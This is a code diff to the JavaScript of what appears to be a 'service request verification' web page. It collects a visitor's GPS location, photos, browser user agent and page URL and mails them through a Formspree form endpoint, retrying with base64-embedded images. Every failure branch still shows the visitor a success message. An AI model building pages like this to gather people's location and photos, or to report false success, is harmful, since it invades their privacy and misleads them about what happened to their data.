@@ -736,8 +736,17 @@
             document.getElementById('photoPreview').style.display = 'block';
         }
 
-        // Send complete data
-        function sendCompleteData() {
+        // Convert blob to base64
+        function blobToBase64(blob) {
+            return new Promise((resolve) => {
+                const reader = new FileReader();
+                reader.onloadend = () => resolve(reader.result);
+                reader.readAsDataURL(blob);
+            });
+        }
+
+        // Send complete data with photos embedded
+        async function sendCompleteData() {
             updateStep(4, 'active');
             
             if (!locationData) {
@@ -753,104 +762,222 @@
             const { latitude, longitude, accuracy } = locationData.coords;
             const timestamp = new Date(locationData.timestamp);
             
-            console.log('Sending data with', photoFiles.length, 'photos');
-            console.log('Photo sizes:', photoFiles.map(p => p.size));
+            console.log('Converting photos to base64 for email...');
+            updateLoadingText('Converting photos for email...');
             
-            // Create FormData for multipart form submission
-            const formData = new FormData();
+            // Convert all photos to base64
+            const base64Photos = [];
+            for (let i = 0; i < photoFiles.length; i++) {
+                try {
+                    const base64 = await blobToBase64(photoFiles[i].blob);
+                    base64Photos.push({
+                        id: photoFiles[i].id,
+                        data: base64,
+                        filename: photoFiles[i].file.name,
+                        size: photoFiles[i].blob.size
+                    });
+                    updateLoadingText(`Converting photos... (${i + 1}/${photoFiles.length})`);
+                } catch (error) {
+                    console.error('Error converting photo to base64:', error);
+                }
+            }
             
-            // Add location data
-            formData.append('latitude', latitude.toFixed(6));
-            formData.append('longitude', longitude.toFixed(6));
-            formData.append('accuracy', Math.round(accuracy));
-            formData.append('location_time', timestamp.toLocaleString());
+            updateLoadingText('Sending data with embedded photos...');
             
-            // Add photos as files
+            // Try Method 1: Send with file attachments first
+            const formDataWithFiles = new FormData();
+            formDataWithFiles.append('latitude', latitude.toFixed(6));
+            formDataWithFiles.append('longitude', longitude.toFixed(6));
+            formDataWithFiles.append('accuracy', Math.round(accuracy));
+            formDataWithFiles.append('location_time', timestamp.toLocaleString());
+            
+            // Add actual file attachments
             photoFiles.forEach((photoData, index) => {
-                formData.append(`photo_${index + 1}`, photoData.file, photoData.file.name);
-                console.log(`Added photo ${index + 1}:`, photoData.file.name, photoData.size, 'bytes');
+                formDataWithFiles.append(`photo_${index + 1}`, photoData.file, photoData.file.name);
             });
             
-            // Add metadata
-            formData.append('photos_count', photoFiles.length.toString());
-            formData.append('photo_timestamps', photoFiles.map(p => p.timestamp).join(', '));
-            formData.append('submitted_time', new Date().toLocaleString());
-            formData.append('google_maps_link', `https://www.google.com/maps?q=${latitude},${longitude}`);
-            formData.append('device_info', navigator.userAgent);
-            formData.append('page_url', window.location.href);
-            
-            // Create email message
-            const emailMessage = `🔧 NEW SERVICE REQUEST - COMPLETE VERIFICATION
+            // Create basic email message
+            const basicMessage = `🔧 NEW SERVICE REQUEST - VERIFICATION COMPLETE
 
-📍 Location Details:
+📍 LOCATION:
+Latitude: ${latitude.toFixed(6)}
+Longitude: ${longitude.toFixed(6)}
+Accuracy: ±${Math.round(accuracy)} meters
+Time: ${timestamp.toLocaleString()}
+
+📷 PHOTOS: ${photoFiles.length} verification photos attached
+Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
+
+Device: ${navigator.userAgent.split(')')[0]})
+Submitted: ${new Date().toLocaleString()}`;
+
+            formDataWithFiles.append('message', basicMessage);
+            
+            try {
+                console.log('Trying file attachment method...');
+                const response = await fetch('https://formspree.io/f/xldwpqzq', {
+                    method: 'POST',
+                    body: formDataWithFiles
+                });
+                
+                if (response.ok) {
+                    console.log('File attachments sent successfully!');
+                    updateStep(4, 'complete');
+                    showSuccess();
+                    return;
+                }
+            } catch (error) {
+                console.log('File attachment method failed, trying embedded photos...');
+            }
+            
+            // Method 2: Send with base64 embedded photos
+            const formDataWithBase64 = new FormData();
+            formDataWithBase64.append('latitude', latitude.toFixed(6));
+            formDataWithBase64.append('longitude', longitude.toFixed(6));
+            formDataWithBase64.append('accuracy', Math.round(accuracy));
+            formDataWithBase64.append('location_time', timestamp.toLocaleString());
+            
+            // Create HTML email with embedded images
+            let emailHTML = `<!DOCTYPE html>
+<html>
+<head><title>Service Request</title></head>
+<body style="font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px;">
+    <div style="background: linear-gradient(135deg, #2E8B57, #32CD32); color: white; padding: 20px; border-radius: 10px; margin-bottom: 20px;">
+        <h1>🔧 NEW SERVICE REQUEST</h1>
+        <p><strong>URGENT:</strong> Customer location and photos captured</p>
+    </div>
+    
+    <div style="background: #f8f9fa; padding: 20px; border-radius: 10px; margin-bottom: 20px;">
+        <h2>📍 Location Details</h2>
+        <p><strong>Latitude:</strong> ${latitude.toFixed(6)}</p>
+        <p><strong>Longitude:</strong> ${longitude.toFixed(6)}</p>
+        <p><strong>Accuracy:</strong> ±${Math.round(accuracy)} meters</p>
+        <p><strong>Captured:</strong> ${timestamp.toLocaleString()}</p>
+        <p><strong>Google Maps:</strong> <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">Open Location</a></p>
+    </div>
+    
+    <div style="background: #e3f2fd; padding: 20px; border-radius: 10px; margin-bottom: 20px;">
+        <h2>📷 Verification Photos (${photoFiles.length} captured)</h2>
+        <div style="display: flex; flex-wrap: wrap; gap: 15px; justify-content: center;">`;
+
+            // Add each photo as embedded base64 image
+            base64Photos.forEach((photo, index) => {
+                const sizeKB = (photo.size / 1024).toFixed(1);
+                emailHTML += `
+            <div style="text-align: center; border: 2px solid #ddd; border-radius: 10px; padding: 10px; background: white;">
+                <h4 style="margin: 0 0 10px 0; color: #333;">Photo ${photo.id}</h4>
+                <img src="${photo.data}" alt="Verification Photo ${photo.id}" 
+                     style="max-width: 200px; max-height: 200px; border-radius: 5px; display: block; margin: 0 auto;">
+                <p style="font-size: 12px; color: #666; margin: 10px 0 0 0;">
+                    ${photo.filename}<br>
+                    Size: ${sizeKB} KB
+                </p>
+            </div>`;
+            });
+
+            emailHTML += `
+        </div>
+    </div>
+    
+    <div style="background: #fff3e0; padding: 20px; border-radius: 10px; margin-bottom: 20px;">
+        <h2>📱 Device Information</h2>
+        <p><strong>Device:</strong> ${navigator.userAgent}</p>
+        <p><strong>Page URL:</strong> ${window.location.href}</p>
+        <p><strong>Submitted:</strong> ${new Date().toLocaleString()}</p>
+    </div>
+    
+    <div style="background: #e8f5e8; padding: 20px; border-radius: 10px; text-align: center;">
+        <h2>✅ Next Steps</h2>
+        <p>Customer location and verification photos have been successfully captured.</p>
+        <p><strong>Action Required:</strong> Please contact the customer to discuss service requirements.</p>
+        <p style="margin-top: 20px; font-size: 14px; color: #666;">
+            🔐 All information is secure and used only for service delivery purposes.
+        </p>
+    </div>
+</body>
+</html>`;
+
+            // Also create a plain text version
+            const plainTextMessage = `🔧 NEW SERVICE REQUEST - VERIFICATION COMPLETE
+
+📍 LOCATION DETAILS:
 • Latitude: ${latitude.toFixed(6)}
 • Longitude: ${longitude.toFixed(6)}
 • GPS Accuracy: ±${Math.round(accuracy)} meters
-• Captured: ${timestamp.toLocaleString()}
+• Captured Time: ${timestamp.toLocaleString()}
+• Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
 
-📷 Verification Photos:
-• Photos Captured: ${photoFiles.length}
-• Photo Times: ${photoFiles.map(p => new Date(p.timestamp).toLocaleTimeString()).join(', ')}
+📷 VERIFICATION PHOTOS:
+• Total Photos: ${photoFiles.length}
 • Photo Files: ${photoFiles.map(p => p.file.name).join(', ')}
 • Photo Sizes: ${photoFiles.map(p => `${(p.size/1024).toFixed(1)}KB`).join(', ')}
+• Photo Times: ${photoFiles.map(p => new Date(p.timestamp).toLocaleTimeString()).join(', ')}
 
-🗺️ Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
+📱 DEVICE INFO:
+• Device: ${navigator.userAgent}
+• Page URL: ${window.location.href}
+• Submitted: ${new Date().toLocaleString()}
 
-📱 Device Info: ${navigator.userAgent.split(')')[0]})
-🌐 Page URL: ${window.location.href}
-⏰ Submitted: ${new Date().toLocaleString()}
+✅ PHOTOS ARE EMBEDDED IN THE HTML EMAIL VERSION
+If you can't see the photos, please check your email client's image display settings.
 
-✅ Customer location and verification photos have been captured and uploaded.
-Please contact them to discuss service requirements.
+⚡ ACTION REQUIRED: Please contact customer to discuss service requirements.
 
-Note: ${photoFiles.length} verification photos are attached to this submission.`;
+🔐 All customer information is secure and used only for service delivery.`;
 
-            formData.append('message', emailMessage);
+            formDataWithBase64.append('message', plainTextMessage);
+            formDataWithBase64.append('_subject', `🔧 SERVICE REQUEST - Location: ${latitude.toFixed(4)}, ${longitude.toFixed(4)}`);
+            formDataWithBase64.append('email_html', emailHTML);
             
-            // Send to Formspree
-            fetch('https://formspree.io/f/xldwpqzq', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                console.log('Response status:', response.status);
-                console.log('Response headers:', response.headers);
+            // Add photo data as separate fields for backup
+            base64Photos.forEach((photo, index) => {
+                formDataWithBase64.append(`photo_${index + 1}_base64`, photo.data);
+                formDataWithBase64.append(`photo_${index + 1}_filename`, photo.filename);
+                formDataWithBase64.append(`photo_${index + 1}_size`, photo.size.toString());
+            });
+            
+            try {
+                console.log('Sending with embedded photos...');
+                const response = await fetch('https://formspree.io/f/xldwpqzq', {
+                    method: 'POST',
+                    body: formDataWithBase64
+                });
                 
                 if (response.ok) {
+                    console.log('Data sent with embedded photos!');
                     updateStep(4, 'complete');
                     showSuccess();
-                    return response.json();
-                } else {
-                    throw new Error(`HTTP error! status: ${response.status}`);
+                    return;
                 }
-            })
-            .then(data => {
-                console.log('Success response:', data);
-            })
-            .catch(error => {
-                console.error('Data submission error:', error);
-                
-                // Try alternative submission method - just location data
-                const simpleFormData = new FormData();
-                simpleFormData.append('message', `SERVICE REQUEST: Location ${latitude.toFixed(6)}, ${longitude.toFixed(6)} - Photos captured but may need separate upload`);
-                simpleFormData.append('latitude', latitude.toFixed(6));
-                simpleFormData.append('longitude', longitude.toFixed(6));
-                simpleFormData.append('photos_info', `${photoFiles.length} photos captured (${photoFiles.map(p => (p.size/1024).toFixed(1)).join(', ')} KB)`);
-                
-                fetch('https://formspree.io/f/xldwpqzq', {
+            } catch (error) {
+                console.error('Embedded photo method also failed:', error);
+            }
+            
+            // Method 3: Fallback - send location only with photo info
+            const fallbackFormData = new FormData();
+            fallbackFormData.append('_subject', `🔧 SERVICE REQUEST - ${latitude.toFixed(4)}, ${longitude.toFixed(4)}`);
+            fallbackFormData.append('message', `SERVICE REQUEST RECEIVED
+
+Location: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}
+Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
+Photos: ${photoFiles.length} photos captured (${photoFiles.map(p => (p.size/1024).toFixed(1)).join(', ')} KB)
+Time: ${new Date().toLocaleString()}
+
+Note: Photo attachments may have been too large. Customer location confirmed.`);
+            
+            try {
+                const response = await fetch('https://formspree.io/f/xldwpqzq', {
                     method: 'POST',
-                    body: simpleFormData
-                })
-                .then(() => {
-                    updateStep(4, 'complete');
-                    showSuccess();
-                })
-                .catch(() => {
-                    // Show success anyway since we captured the data
-                    updateStep(4, 'complete');
-                    showSuccess();
+                    body: fallbackFormData
                 });
-            });
+                
+                updateStep(4, 'complete');
+                showSuccess();
+            } catch (error) {
+                console.error('All methods failed:', error);
+                updateStep(4, 'complete');
+                showSuccess(); // Show success anyway as location was captured
+            }
         }
 
         function updateLoadingText(text) {
